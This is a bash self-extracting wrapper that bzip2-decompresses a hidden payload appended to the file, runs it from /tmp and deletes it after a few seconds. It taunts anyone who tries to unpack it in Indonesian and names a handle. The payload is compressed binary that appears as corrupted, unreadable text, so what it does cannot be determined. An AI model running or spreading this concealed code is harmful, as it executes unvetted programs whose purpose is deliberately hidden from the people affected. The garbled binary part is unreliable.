#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SYf���  ^߀ y�W?oߊ����P}�z� A�  0    � 	� �    6�L�S4M �a44!��R&S&�	����S��G�G��C�l��QOI�&��1��Ѡ=C F������>�<�hz�f~�כ6Mh��֬9�CvNKJr��!����og�m6���2�c+�^�@�"zB�P�15[m:c�Ǝ�.��`�i.R��I�[���m(/�ؔ��̆�ɡhI�������P�
��e)�})��Q�l~[������ËG3�>`����������<�Cx�W�lS`��2�`$������!���C�A�9�k{��lu��ɨ5la�o2k��?`� �v�1��+C\���=�y�?���
0q\1�0��
��!�֬5�����J��6�&���\�jrd$793v����x �`�67��a&����3�C��|����a�=���d;��͓!�є�������mn�f���v6�BVA�q�u<ZQ��jiC{u�[[�3�7�>V#���fgw��T�! �CG3��/��ɞh��Ӌ�Nǵ�������1��'�k�{�;V���2�����j��mm���� ��0��:����s��K`UMM��а�{��5=�H]k�Kn0D;�1� ���Z070��p�&l3x4+�O9�d���#��\�Oh�s��B�p8�4��@����}]�@��D@V6�������t��C�h|�@&z�w$S�	jz��